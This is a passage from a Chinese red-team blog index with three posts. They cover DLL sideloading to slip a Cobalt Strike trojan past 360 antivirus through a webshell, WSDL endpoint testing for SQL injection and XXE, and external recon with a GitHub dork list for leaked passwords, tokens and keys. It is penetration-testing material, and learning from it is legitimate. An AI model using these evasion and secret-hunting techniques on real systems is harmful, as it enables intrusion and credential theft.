class="hljs-keyword">case</span> DLL_THREAD_ATTACH: <br><span class="hljs-keyword">case</span> DLL_THREAD_DETACH: <br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH: <br><span class="hljs-keyword">break</span>; <br>&#125; <br><span class="hljs-keyword">return</span> TRUE; <br>&#125; <br></code></pre></td></tr></table></figure><p>测试发现成功弹出计算器，说明这个dll是可以被我们利用的，那么我们是不是就可以利用白加黑来达到我们的一下目的呢比如免杀线上等其他操作了呢！</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps7.jpg" alt="img"> </p><p>但是我们可以发现该dll 是windows自带的dll，我们可以去利用everything去查看一下</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps8.jpg" alt="img"> </p><p>但是像这些dll都会被360给标记我们可以去测试一下来个静态查杀，至于为撒会被查杀是可能360觉得你单独将这些dll放出来就会存在一些嫌疑，个人觉得哈。</p><p>测试发现你去查杀就会报毒的。</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps9.jpg" alt="img"> </p><p>所以建议大家在挖掘dll时最好去挖一些厂商自带的dll，不是去调用windows本身的dll，这里我们测试一下，去换一个厂自带的dll去测试发现就不会报毒，测试的这个dll就不是windows自带的dll，所以360就不会去查杀它，那这样是不是对我们做免杀会更加隐秘呢？</p><p>当然windows自带的dll也是能利用的，可能会增加一些风险。</p><p>类似这种劫持非常多，包括很多软件不是微软的dll，他们的自己的dll很多存在这些问题。 </p><p>一些公开的：<a href="https://hijacklibs.net/">https://hijacklibs.net/</a></p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps10.jpg" alt="img"> </p><p>这里对挖dll做个总结，我们最好是挖一些厂商自带的dll会更好一些，其挖掘方法也是和上面的思路是一样的，当然我写的方法较为简单，这里推荐大家一些文章吧</p><p><a href="https://www.ijiandao.com/2b/baijia/418614.html">https://www.ijiandao.com/2b/baijia/418614.html</a></p><p><a href="https://www.seoxiehui.cn/article-353755-1.html">https://www.seoxiehui.cn/article-353755-1.html</a></p><p><a href="http://tttang.com/archive/1365/">http://tttang.com/archive/1365/</a></p><h2 id="白加黑利用场景"><a href="#白加黑利用场景" class="headerlink" title="白加黑利用场景"></a>白加黑利用场景</h2><p>在挖掘完能被劫持利用的dll后我们就可以利用白加黑的方式来上线我们的木马了，这里我讲了一个白加黑的利用场景，也是挺受用的。</p><p>就是我们在拿到一个webshell时都希望我们能上线到我们的CS上去，但是假如我们的目标存在360并且开了核晶时我们该怎么办上线我们的木马呢？</p><p>有人会说通过webshell上传一个exe，去用蚁剑等工具直接去运行它不就可以上线了嘛！那真的可行嘛？毕竟这不是靶场，我们一个start x.exe 就成功上线了啊？而且我们的环境还是360加核晶的，我们也不妨来试试看能不能行嘛</p><p>这里上传了一个5.exe的马并且是做了免杀的哦，我们在桌面上去点击是可以上线的，但是问题就出来了，我们能登到目标的桌面上嘛？我们现在就一个webshell，只能通过这个webshell来上线了！</p><p>这时我们测试发现直接运行5.exe 目标机会被360拦的，可能我们还在想是不是我们的马有问题还是wenshell管理工具有问题，其实都不是，就是我们的马被360给拦了！</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps11.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps12.jpg" alt="img"> </p><p>那接下来来我们该怎么办呢，这里我们就可以利用我们的白加黑来操作了，我们把我们的马放进去利用白文件加载黑dll来上线，再通过蚁剑来运行一下试试呢？</p><p> 发现通过这个方法就可以绕过360+核晶来成功上线我们的CS了</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps13.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps14.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/wps15.jpg" alt="img"> </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.这里我们简单讲解了一下dll挖掘的方法，以及推荐大家去挖掘厂商自带的存在问题的dll会更好一些</p><p>2.在真实环境中我们会遇到很多问题，并不会像靶场一样那么简单就能上线的，这里我也讲述了一个绕过360+核晶的上线方法，就是利用我们常见的白加黑方式，这个方式会360来说非常有效，所以说白加黑还是挺有用的，当然知道社区大佬多，可能早都知道了这个方法，哈哈 应该还是有需要的兄弟吧</p><p>3.当然绕过360上线不止这一个方法了，什么利用powershell来上线360+核晶的方法也是可以的，但是也是需要绕过的，大佬们可以研究一下</p>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DLL挖掘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WSDL渗透测试</title>
    <link href="/2024/02/23/WSDL%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <url>/2024/02/23/WSDL%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通常在网站通讯中很多都会调用api接口去管理更多得信息，但是这往往会是发开人员做限制比较薄弱得地方，就可能让我们有机可乘，在一次攻防中我就遇到了这个场景</p><h2 id="WSDL"><a href="#WSDL" class="headerlink" title="WSDL"></a>WSDL</h2><p>​有人在WebService开发的时候，特别是和第三方有接口的时候，走的是SOAP协议，然后用户（或后台）给你一个WSDL文件（或网址）</p><p>​WSDL (Web Services Description Language,Web服务描述语言)是一种XML Application，他将Web服务描述定义为一组服务访问点，客户端可以通过这些服务访问点对包含面向文档信息或面向过程调用的服务进行访问(类似远程过程调用)。WSDL首先对访问的操作和访问时使用的请求&#x2F;响应消息进行抽象描述，然后将其绑定到具体的传输协议和消息格式上以最终定义具体部署的服务访问点。相关的具体部署的服务访问点通过组合就成为抽象的Web服务</p><h2 id="WSDL会产生什么漏洞"><a href="#WSDL会产生什么漏洞" class="headerlink" title="WSDL会产生什么漏洞"></a>WSDL会产生什么漏洞</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>.Web 应用安全漏洞:<br>   sql注入<br>   xss攻击<br>   命令执行<br>   越权<br>   LDAP注入<br>   缓冲区溢出<br>   逻辑漏洞<br>   等等<br>   <br><span class="hljs-number">2</span>.<span class="hljs-keyword">XML</span> <span class="hljs-title">相关的特殊安全漏洞:</span><br><span class="hljs-title">   XPath</span>注入<br>   XQuery注入<br>   拒绝服务攻击（SOAP 数组溢出、递归的 <span class="hljs-keyword">XML</span> <span class="hljs-title">实体声明、超大消息体）</span><br><span class="hljs-title">   信息泄漏（XML</span> External Entity File Disclosure）<br>   等等<br></code></pre></td></tr></table></figure><h2 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h2><p>一、 发现该站点存在WSDL网站（其实WSDL得特征还是挺明显得，但是从明面上发现没有可利用得功能点，可能经验少的人就会略过，但他不曾想到这个站点会给他带来惊喜）<strong>但是这不是WSDL的单一特征</strong></p><p><strong>hunter语法: web.body&#x3D;”WS-Inspection “</strong></p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240223165256204.png" alt="image-20240223165256204"></p><p>二、WSDL是一个api接口我们需要利用工具或者插件去探索各个接口下的xml文档，而漏洞就是产生在这些xml文档中</p><p>我们可以直接利用<strong>burp中的插件Wsdler</strong></p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240223170100243.png" alt="image-20240223170100243"></p><p>安装完插件利用该插件去查看存在的xml包</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240223171138234.png" alt="image-20240223171138234"></p><p>发现存在xml数据包</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240223171353819.png" alt="image-20240223171353819"></p><p>接下来我们就可以对该数据包进行漏洞探测了，一般常见的就是sql注入和xxe了</p><p><strong>sql注入漏洞</strong></p><p>一般通wsdl发现的注入都是sqlserver数据库，要是又是DBA权限的话那离拿shell也不远了</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240223180901639.png" alt="image-20240223180901639"></p><p><strong>xxe漏洞</strong></p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240223180117000.png" alt="image-20240223180117000"></p>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红队-外网信息收集</title>
    <link href="/2024/02/22/%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2024/02/22/%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在攻防演练也很频繁，也越来越不好打，但当我们在前期信息收集做的越完善时可能就会有新的发现来帮助我们突破外网边界。</p><h3 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h3><h4 id="根域收集"><a href="#根域收集" class="headerlink" title="根域收集"></a>根域收集</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs perl">企查查 ：https:<span class="hljs-regexp">//</span>www.qcc.com/<br>爱企查 ：https:<span class="hljs-regexp">//ai</span>qicha.baidu.com/<br>查询旗下收购公司信息：https:<span class="hljs-regexp">//</span>www.crunchbase.com/ 这个可能更常用于src挖掘的资产收集中，查询那家单位被收购了可能被收购的公司漏洞也会要<br>小蓝本：https:<span class="hljs-regexp">//</span>www.xiaolanben.com/<br>钉钉企典：https:<span class="hljs-regexp">//</span>www.dingtalk.com/qidian/<br>自动收集工具 ：ENScan_GO   https:<span class="hljs-regexp">//gi</span>thub.com/afwu/ENScan_GO<br><br><br>ASN枚举：https:<span class="hljs-regexp">//</span>bgp.he.net/AS4509<span class="hljs-number">0</span><span class="hljs-comment">#_prefixes </span><br>通过asn枚举寻找资产，但更多用于src挖掘（推荐文章：https:<span class="hljs-regexp">//x</span>z.aliyun.com/t/<span class="hljs-number">9455</span>?time__1311=n4%2BxuDgD9AdGq4WqGNDQT4BIfdSW1Oit4D&amp;alichlgref=https%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%2Fwww.baidu.com%<span class="hljs-number">2</span>Flink%<span class="hljs-number">3</span>Furl%3D9itPJUbnIjx9tjQajL2HdKKad1CgTFhTFnx8OJzqe1VKV13jzg2BpuGBSoT00Z-R%26wd%<span class="hljs-number">3</span>D%26eqid%3Dc68682be000300ca0000000465d6f765）<br><br>通过上述方法收集到目标的根域以及下属单位的域名<br></code></pre></td></tr></table></figure><h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">常用的资产搜索引擎推荐<br>鹰图：https://hunter.qianxin.com/  新资产多但有些敏感的资产不能查看<br>fofa：https://fofa.info/  常用，老资产比较多时不时会发现边缘资产<br>quake：https://quake.360.net/quake/login<span class="hljs-comment">#/ 资产还可以敏感资产可以查看也是目前花钱最便宜的了</span><br>shodan：https://www.shodan.io/  国外资产收集平台，时不时用一下也可能会发现意外资产<br><br>注：我们在搜索时一定要对目标资产用多个语法查询资产，可能就会有新的收获，比如搜索c段、域名、备案、公司名、标题、证书、全资子公司等<br></code></pre></td></tr></table></figure><h4 id="域名收集-1"><a href="#域名收集-1" class="headerlink" title="域名收集"></a>域名收集</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">oneforall : https://github.com/shmilylty/OneForAll<br>命令单个：python3 oneforall.py --target target.com run<br>命令批量：python3 oneforall.py --targets domain.txt run<br>也是比较常用的子域名收集工具了<br><br>Sublist3r 项目地址：https://github.com/aboul3la/Sublist3r 命令：python sublist3r.py -d target.com -b -t 50 -p 80,443,21,22<br>默认参数扫描子域名<br>python sublist3r.py -d baidu.com <br>使用暴力枚举子域名<br>python sublist3r -b -d baidu.com <br><br>ksubdomain ： https://github.com/boy-hack/ksubdomain<br><br>subfinder：https://github.com/projectdiscovery/subfinder<br><br>https://www.wolframalpha.com/  国外子域收集网站<br></code></pre></td></tr></table></figure><h4 id="证书收集"><a href="#证书收集" class="headerlink" title="证书收集"></a>证书收集</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://search.censys.io/<br>https://crt.sh/<br>https://dnsdumpster.com/<br></code></pre></td></tr></table></figure><h4 id="自动资产收集"><a href="#自动资产收集" class="headerlink" title="自动资产收集"></a>自动资产收集</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">灯塔 ：https://github.com/TophantTechnology/ARL 会自动收集目标资产并探测一些敏感目录和漏洞，因为有些系统在二级目录下所以时不时会有意外收获<br>水泽：https://github.com/0x727/ShuiZe_0x727<br></code></pre></td></tr></table></figure><h4 id="谷歌-Github-语雀-语法"><a href="#谷歌-Github-语雀-语法" class="headerlink" title="谷歌&amp;Github&amp;语雀 语法"></a>谷歌&amp;Github&amp;语雀 语法</h4><p>通过google语法收集资产</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240222160613354.png"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">以及其他常用语法<br><br><span class="hljs-symbol">intext:</span><span class="hljs-string">&quot;© XXX版权所有&quot;</span><br><br><span class="hljs-symbol">site:</span> xxx.com filetype:doc 、pdf、xls<br><br><span class="hljs-symbol">site:</span> xxx.com 管理、后台、系统、密码、账号<br></code></pre></td></tr></table></figure><p><strong>Github语法</strong>  (注：在平时收集资产时可以通过github来收集一些敏感的资产)</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240222173215648.png"></p><p><strong>参考语法</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&quot;token&quot;  <br>&quot;password&quot;  <br>&quot;secret&quot;  <br>&quot;passwd&quot;  <br>&quot;username&quot;  <br>&quot;key&quot;  <br>&quot;apidocs&quot;  <br>&quot;appspot&quot;  <br>&quot;auth&quot;  <br>&quot;aws\_access&quot;  <br>&quot;config&quot;  <br>&quot;credentials&quot;  <br>&quot;dbuser&quot;  <br>&quot;ftp&quot;  <br>&quot;login&quot;  <br>&quot;mailchimp&quot;  <br>&quot;mailgun&quot;  <br>&quot;mysql&quot;  <br>&quot;pass&quot;  <br>&quot;pem private&quot;  <br>&quot;prod&quot;  <br>&quot;pwd&quot;  <br>&quot;secure&quot;  <br>&quot;ssh&quot;  <br>&quot;staging&quot;  <br>&quot;stg&quot;  <br>&quot;stripe&quot;  <br>&quot;swagger&quot;  <br>&quot;testuser&quot;  <br>&quot;jdbc&quot;  <br><span class="hljs-keyword">extension</span>:pem private  <br><span class="hljs-keyword">extension</span>:ppk private  <br><span class="hljs-keyword">extension</span>:<span class="hljs-keyword">sql</span> mysql dump <span class="hljs-keyword">password</span>  <br><span class="hljs-keyword">extension</span>:<span class="hljs-type">json</span> api.forecast.io  <br><span class="hljs-keyword">extension</span>:<span class="hljs-type">json</span> mongolab.com  <br><span class="hljs-keyword">extension</span>:yaml mongolab.com  <br><span class="hljs-keyword">extension</span>:ica \[WFClient\] <span class="hljs-keyword">Password</span>\=  <br><span class="hljs-keyword">extension</span>:avastlic “support.avast.com”  <br><span class="hljs-keyword">extension</span>:js jsforce conn.<span class="hljs-keyword">login</span>  <br><span class="hljs-keyword">extension</span>:<span class="hljs-type">json</span> googleusercontent client\_secret  <br>“target.com” send\_keys  <br>“target.com” <span class="hljs-keyword">password</span>  <br>“target.com” api\_key  <br>“target.com” apikey  <br>“target.com” jira\_password  <br>“target.com” root\_password  <br>“target.com” <span class="hljs-keyword">access</span>\_token  <br>“target.com” config  <br>“target.com” client\_secret  <br>“target.com” <span class="hljs-keyword">user</span> auth<br></code></pre></td></tr></table></figure><p><strong>语雀信息收集</strong></p><p>可以结合目标系统以及你收集到的信息来语雀搜索敏感资料和信息，比如域名、邮箱、系统名、公司名等方法搜索</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240222173521901.png"></p><h4 id="JS子域收集"><a href="#JS子域收集" class="headerlink" title="JS子域收集"></a>JS子域收集</h4><p>通过burp收集js中的根域和子域名</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240222161125178.png"></p><p>通过 gospider工具收集网站内js中的其他子域</p><p>链接：<a href="https://github.com/jaeles-project/gospider">https://github.com/jaeles-project/gospider</a></p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240222161255418.png"></p><p>通过SubDomainizer工具收集子域</p><p><a href="https://github.com/nsonaniya2010/SubDomainizer">https://github.com/nsonaniya2010/SubDomainizer</a></p><p>功能：</p><p>1.查找js文件中引用的子域</p><p>2.查找js文件中引用的云服务<br>3.使用香农熵公式在js文件中找到潜在的敏感项它只需要一个页面，扫描js文件进行分析。</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240222161802500.png"></p><p>注：在我们收集资产中除了打web外，其实也可以尝试打他们的云服务，在很多时候发开会不小心将相关密钥放在js文件中，若要是有发现那也可以获得一定的分数，甚至能在云服务中发现更多有用的信息。</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240222161817624.png"></p><h4 id="APP资产收集"><a href="#APP资产收集" class="headerlink" title="APP资产收集"></a>APP资产收集</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">七麦数据：https:<span class="hljs-regexp">//</span>www.qimai.cn/ 收集目标旗下的app<br>酷传：https:<span class="hljs-regexp">//</span>www.kuchuan.com/ 收集目标旗下的app<br>蝉应用：https:<span class="hljs-regexp">//</span>app.chandashi.com/ 收集目标旗下的app<br>豌豆荚：https:<span class="hljs-regexp">//</span>www.wandoujia.com/ 获取app历史版本<br>摸瓜：https:<span class="hljs-regexp">//m</span>ogua.co/  对app反编译收集app中的敏感信息，可能会发现新的ip、域名、密钥等信息<br>appinfoscanner：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/kelvinBen/</span>AppInfoScanner 收集app中的敏感信息<br></code></pre></td></tr></table></figure><h4 id="小程序资产收集"><a href="#小程序资产收集" class="headerlink" title="小程序资产收集"></a>小程序资产收集</h4><p>通过微信搜索相关字以及目标公司全名</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240222173928682.png"></p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240222174215392.png"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">naabu:https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/projectdiscovery/</span>naabu 扫描全端口快<br>Rustscan:https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/RustScan/</span>RustScan 扫描全端口快<br>vscan:https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/veo/</span>vscan 会快速扫描资产全端口、也是漏洞扫描工具<br>railgun：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/lz520520/</span>railgun 多功能信息收集工具有全端口扫描功能但是扫描慢但我觉得准一点<br></code></pre></td></tr></table></figure><h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">ehole:https://github.com/ShiHuang-ESec/EHole 对收集的资产指纹识别，但是识别不全需要自己加指纹<br>Ehole_magic：https://github.com/lemonlove7/EHole_magic 魔改版，好处是可以自己添加目录路径，因为现在很多系统都在二级目录下的，我们可以在平常项目中积累一些特殊的目录放置进去说不定哪天就遇到了<br><br>就比如：xxljob的一些目录：<br>/xxl-job-admin<br>/xxl-job-admin-2.1.0<br>/job-admin<br>/job-admin/joblog<br><br>帆软：<br>/webroot/decision/login<br>/webroot<br>/webroot/decision/remote/design/channel<br><br>smartbi：<br>/smartbi/<br>/smartbi/vision/RMIServlet<br></code></pre></td></tr></table></figure><h4 id="供应链资产收集"><a href="#供应链资产收集" class="headerlink" title="供应链资产收集"></a>供应链资产收集</h4><p>在很多项目中他们的系统都会存在是第三方开发的系统，但是目标的系统不存在什么历史漏洞和弱密码，那我们就可以去收集该系统的特征去资产收集平台查询是否存在相同的站或者找到官方测试站，然后去对别的相同的站或测试站渗透测试，往往别的站或测试站就会存在弱口令等问题我们就想办法拿到测试站或相同的站的shell后拿源码去审计源码通过0day去测试我们的目标站点。该方法已经是现在攻防常走的攻击思路了，毕竟再靠历史漏洞去打真的越来越难打了，尤其是比较难的项目！</p><p><strong>怎么收集呢</strong></p><p>1、通过查看网站js源码找特征去搜</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240222180242077.png"></p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240222180255298.png"></p><p>2、通过查看系统图标去搜</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240223104700766.png"></p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240222180534273.png"></p><p>3、搜索系统名字</p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240222180619786.png"></p><p><img src="https://raw.githubusercontent.com/yywqq123/yywqq123.github.io/main/image/image-20240222180708297.png"></p><p><strong>参考文章：</strong></p><p><a href="https://mp.weixin.qq.com/s/mOC5OgKRCOWCu1BpoMt6Sw">https://mp.weixin.qq.com/s/mOC5OgKRCOWCu1BpoMt6Sw</a> </p><p><a href="https://mp.weixin.qq.com/s/S4uzxutSBAbqS3LtNlDAhQ">https://mp.weixin.qq.com/s/S4uzxutSBAbqS3LtNlDAhQ</a></p><p><strong>总结：</strong>只有前期做越好的信息收集工作可能才会有新的惊喜</p>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
